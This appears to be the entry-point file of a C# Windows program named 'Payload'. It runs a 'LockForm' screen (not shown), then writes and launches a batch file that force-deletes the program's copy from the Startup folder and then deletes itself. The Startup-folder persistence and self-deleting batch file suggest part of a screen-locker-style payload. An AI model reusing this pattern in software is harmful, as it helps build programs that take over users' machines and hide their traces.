using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Diagnostics;
using System.IO;

namespace Payload
{
    static class Program
    {
        /// <summary>
        /// Whether a batch file will be created to remove the application from the startup folder after this program closes.
        /// </summary>
        public static bool ExternalDeletion = false;

        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new LockForm());
            if (ExternalDeletion)
            {
                // Create a batch file that will be run while this application is closing, so that the application in the startup folder can be deleted.
                string filename = "RemoveFromStartup.bat";
                CreateDeletingBatchFile(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + filename, LockForm.StartupFilepath);
                Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + filename);
            }
        }

        private static void CreateDeletingBatchFile(string filename, string executableFilepath)
        {
            // Create a batch file to delete the executable in the startup folder after it (this) terminates.
            string text = string.Empty;

            text += "@ECHO off\n";
            text += "ping 127.0.0.1 > nul\n";
            text += string.Format("echo j | del /F " + "\"{0}\"\n", executableFilepath);
            text += string.Format("echo j | del \"{0}\"\n", filename);
            text += "cls";
            File.WriteAllText(filename, text);
        }
    }
}
